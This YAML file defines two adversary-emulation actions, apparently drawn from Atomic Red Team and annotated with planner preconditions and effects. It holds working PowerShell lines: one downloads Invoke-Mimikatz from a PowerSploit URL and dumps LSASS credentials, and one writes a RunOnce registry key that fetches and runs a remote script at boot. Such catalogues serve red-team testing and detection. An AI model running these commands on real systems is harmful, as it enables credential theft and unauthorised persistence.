  - uuid: art-t1003_001-mimikatz-powershell
    name: Powershell Mimikatz
    id:
      - T1003.001
    source: Atomic Red Team
    supported_platforms:
      - windows
    tactics:
      - Credential Access
    technique:
      - 'OS Credential Dumping: LSASS Memory'
    description: |
      Dumps credentials from LSASS memory by invoking a remote Invoke-Mimikatz.ps1
      (PowerSploit variant). Requires elevated PowerShell context and outbound
      HTTPS to the script host. See ART auto_generated_guid
      66fb0bc1-3c3f-47e9-a298-550ecfefacbc for cross-ref.
    execution:
      executor: Powershell Executor
      command: |
        [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
        IEX (New-Object Net.WebClient).DownloadString('#{remote_script}'); Invoke-Mimikatz -DumpCreds
    arguments:
      executor:
        description: The Powershell session ID used to invoke the command.
        required: true
        pddl_index: executor0_var_in_plan
      remote_script:
        default: 
          https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1
        description: URL to a hosted Invoke-Mimikatz.ps1 (PowerSploit / mirror).
        required: true
    preconditions:
      - (os-windows ?target - host)
      - (powershell ?executorID - executor ?target - host)
      - (elevated-executor ?executorID - executor)
    effects:
      - (credential-data ?d - data ?target - host)
      - (data-stored-c2 ?d - data)
  - uuid: art-t1547_001-powershell-runonce
    name: PowerShell Registry RunOnce
    id:
      - T1547.001
    source: Atomic Red Team
    supported_platforms:
      - windows
    tactics:
      - Persistence
    technique:
      - 'Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder'
    description: |
      Sets `NextRun` under a Run/RunOnce registry path via PowerShell's
      `Set-ItemProperty`. Payload runs at next system boot. Demonstrates
      the PowerShell variant of the classic Run-key persistence pattern.
      ART auto_generated_guid eb44f842-0457-4ddc-9b92-c4caa144ac42.
    execution:
      executor: Powershell Executor
      command: |
        Set-ItemProperty "#{reg_key_path}" "NextRun" '#{command_to_execute}'
    arguments:
      executor:
        description: The Powershell session ID used to invoke Set-ItemProperty.
        required: true
        pddl_index: executor0_var_in_plan
      reg_key_path:
        default: HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce
        description: Registry path for the RunOnce entry.
        required: true
      command_to_execute:
        default: powershell.exe -Command IEX (New-Object Net.WebClient).DownloadString('https://example.com/payload.ps1')
        description: Command line invoked at next system boot.
        required: true
        pddl_index: string3_var_in_plan
    preconditions:
      - (os-windows ?target - host)
      - (powershell ?executorID - executor ?target - host)
      - (elevated-executor ?executorID - executor)
    effects:
      - (command-execution-at-startup ?c - string ?target - host)
